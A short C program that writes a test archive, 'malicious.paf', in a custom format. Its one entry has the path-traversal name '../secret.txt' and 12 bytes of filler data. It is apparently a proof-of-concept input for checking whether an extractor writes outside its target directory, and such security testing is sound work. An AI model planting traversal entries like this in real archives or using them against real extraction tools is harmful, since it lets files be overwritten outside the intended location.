#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// Simple Malicious PAF Creator
// Format: 4 bytes Magic, 4 bytes count, then entries...
int main() {
    FILE* f = fopen("malicious.paf", "wb");
    fwrite("PAF1", 1, 4, f);
    uint32_t count = 1;
    fwrite(&count, 4, 1, f);
    
    // Malicious entry: ../secret.txt
    const char* mal_path = "../secret.txt";
    uint16_t len = (uint16_t)strlen(mal_path);
    fwrite(&len, 2, 1, f);
    fwrite(mal_path, 1, len, f);
    
    uint32_t size = 12;
    uint32_t offset = 0; // Data block offset (not really used in this quick test)
    uint32_t crc = 0;
    fwrite(&size, 4, 1, f);
    fwrite(&offset, 4, 1, f);
    fwrite(&crc, 4, 1, f);
    
    // Data
    fwrite("HACHED DATA", 1, 12, f);
    
    fclose(f);
    printf("Malicious PAF created.\n");
    return 0;
}
